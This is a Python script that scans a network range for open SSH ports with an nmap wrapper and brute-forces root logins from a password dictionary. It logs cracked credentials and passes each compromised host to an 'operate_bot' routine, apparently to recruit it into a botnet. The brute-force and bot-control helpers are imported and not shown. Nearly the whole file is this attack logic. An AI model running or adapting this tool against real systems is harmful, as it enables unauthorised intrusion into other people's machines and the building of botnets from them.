#!/usr/bin/env python3
# coding=utf-8
__author__ = "riverchu"

import optparse
from operate import *
from scan.nmapscan import *


def start_chu_brute(brute_type, host, user, dictionary, *, thread_num=gv.MAX_CONNECTIONS):
    """爆破主函数

    :param brute_type: 破解目标服务
    :param host: 目标主机范围
    :param user: 破解用户名
    :param dictionary: 字典路径
    :param thread_num: 最大测试线程数
    :return:
    """
    if brute_type is 'ssh':
        # 指定bot信息存储文件
        gv.bot_info_file = host.replace('/', 'mask') + '.txt'

        print('[+] Start scan host ' + host)

        ssh_scan = RiverNmapScan()

        for open_host_info in ssh_scan.scan_async(host, 22, 'ssh'):
            print('[*] Start brute ', open_host_info['ip'])

            brute_ret = brute(open_host_info['ip'], user, dictionary, connections=thread_num)
            save_info(mode='scan_log', filename=gv.BOT_PATH + 'scan.log', info=brute_ret)
            if brute_ret['key'] is None:
                continue

            print('[+] Brute ' + open_host_info['ip'] + ' result:',
                  'user: ' + brute_ret['user'],
                  'password: ' + brute_ret['key'])

            time.sleep(gv.OPERATE_INTERVAL)
            operate_bot(brute_ret)

        print('[+] End scan and brute.')


def main(host, user, dictionary, *, thread_num=gv.MAX_CONNECTIONS):
    """函数入口

    :param host:
    :param user:
    :param dictionary:
    :param thread_num:
    :return:
    """
    # 需增加排除ip功能
    print('[+] Test ssh scan and brute.')
    start_chu_brute('ssh', host, user, dictionary, thread_num=thread_num)


if __name__ == "__main__":
    host = '10.108.103.215'
    user = 'root'
    main(host, user, gv.SSH_DICTIONARY)
    # file_info = read_file()
    # for info in file_info:
    #     print(info)
    #     if file_info[info]['key'] == 'None':
    #         continue
    #     # operate_bot(file_info[info])
    #     print(file_info[info])
